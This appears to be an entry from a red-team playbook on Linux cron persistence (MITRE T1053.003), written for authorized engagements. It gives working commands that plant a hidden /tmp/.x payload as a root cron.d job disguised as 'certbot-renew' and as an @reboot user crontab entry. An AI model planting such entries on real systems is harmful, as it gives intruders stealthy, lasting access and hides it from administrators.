---
id: cron-persist
title: Cron persistence (crontab / cron.d callback)
section: Linux persistence (authorized engagements only)
phase: Persistence
attack:
  tactic: TA0003
  techniques: [T1053.003]
platform: [linux]
source: MITRE ATT&CK T1053.003; Linux cron persistence
pair: cron-persist-auditd
---

The Linux twin of scheduled-task persistence: a cron entry fires your payload on a
fixed schedule or at reboot, surviving logout and reboot under whatever account owns
the crontab — root if you can reach it. The quiet places are not a user's own
`crontab -e` but the system drop-dirs, where a new file reads as package-installed
routine: `/etc/cron.d/`, the `/etc/cron.{hourly,daily,weekly}/` script dirs, and
`/var/spool/cron/` where the per-user tables actually live. `@reboot` is the
reboot-survival trigger. Authorized persistence testing only — clean it up and
document it.

```sh
# system-wide drop (root): a cron.d fragment beats the noisier `crontab -e`
echo '* * * * * root /tmp/.x >/dev/null 2>&1' > /etc/cron.d/certbot-renew
# per-user, reboot-survival trigger, no file you had to name
( crontab -l 2>/dev/null; echo "@reboot /tmp/.x" ) | crontab -
```
